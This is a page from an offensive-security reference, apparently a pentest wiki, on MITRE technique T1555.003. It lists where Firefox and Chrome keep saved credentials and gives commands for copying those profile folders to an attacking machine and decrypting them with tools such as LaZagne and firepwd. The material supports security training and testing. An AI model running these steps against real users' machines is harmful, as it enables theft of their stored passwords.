---
description: >-
  MITRE ATT&CK™  Credentials from Password Stores: Credentials from Web
  Browsers  - Technique T1555.003
---

# Credentials from Web Browsers

## Theory

Adversaries may acquire credentials from web browsers by reading files specific to the target browser.[\[1\]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

## Practice

### Firefox

{% tabs %}
{% tab title="UNIX-like" %}
On UNIX-type systems, stored credentials are kept in firefox profile folders such as :

```
/home/<Username>/.mozilla/firefox/xxxx.default
```

We may download the entire `~/.mozilla/firefox` folder to our attacking machine and use [firefox\_decrypt](https://github.com/unode/firefox\_decrypt) to  decrypt passwords.

```bash
python3 firefox_decrypt.py <Victime_ProfileFolder>
```
{% endtab %}

{% tab title="Windows" %}
On Windows, stored credentials are kept in firefox profile folders such as :

```
C:\Users\<Username>\AppData\Roaming\Mozilla\Firefox\Profiles\xxxx.default
```

#### Firepwd

We may download the entire `Profiles` folder to our attacking machine and use [firepwd](https://github.com/lclevy/firepwd) to  decrypt passwords.

```bash
# Decrypt
python firepwd.py -d <Victime_ProfileFolder>

# Provide user's password (if secrests are encrypted using DPAPI)
python firepwd.py -d <Victime_ProfileFolder> -p <Password>
```

#### LaZagne

The [LaZagne](https://github.com/AlessandroZ/LaZagne) (Python) project is a go-to reference from browser credentials dumping (among other awesome dumping features).

```powershell
PS> laZagne.exe browsers [-password P@ssword!]
```

#### LaZagneForensic

Alternatively, the [LaZagneForensic](https://github.com/AlessandroZ/LaZagneForensic) (Python) project can be used to decrypt passwords from a linux hosst, using a mounted file system (/tmp/disk). &#x20;

```
python laZagneForensic.py browsers -local /tmp/disk -password 'Password'
```
{% endtab %}
{% endtabs %}

### Google Chrome

{% tabs %}
{% tab title="UNIX-like" %}
On UNIX-type systems, stored credentials are kept in Google Chrome profile folders such as :

```
/home/<Username>/.config/google-chrome/default
```

We may download the entire `Default` folder to our attacking machine and use [chrome\_password\_grabber](https://github.com/priyankchheda/chrome\_password\_grabber) to  decrypt passwords. Not that the default script profile folder path should be edited.&#x20;

```bash
python chrome.py
```
{% endtab %}

{% tab title="Windows" %}
On Windows, stored credentials are kept in Google Chrome profile folders such as :

```
C:\Users\<Username>\AppData\Local\Google\Chrome\User Data\Default
```

#### LaZagne

The [LaZagne](https://github.com/AlessandroZ/LaZagne) (Python) project is a go-to reference from browser credentials dumping (among other awesome dumping features).

```powershell
PS> laZagne.exe browsers -password P@ssword!
```

#### Decrypt-Chrome-Passwords

We may use [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords/tree/main) to  decrypt passwords.

```powershell
PS> python decrypt_chrome_password.py
```

#### Chrome-Decrypter

[chrome-decrypter](https://github.com/byt3bl33d3r/chrome-decrypter) can also be used as follows.

```powershell
PS> .\chrome_decrypt.exe
```

#### LaZagneForensic

Alternatively, the [LaZagneForensic](https://github.com/AlessandroZ/LaZagneForensic) (Python) project can be used to decrypt passwords from a linux hosst, using a mounted file system (/tmp/disk). &#x20;

```
python laZagneForensic.py browsers -local /tmp/disk -password 'Password'
```
{% endtab %}
{% endtabs %}
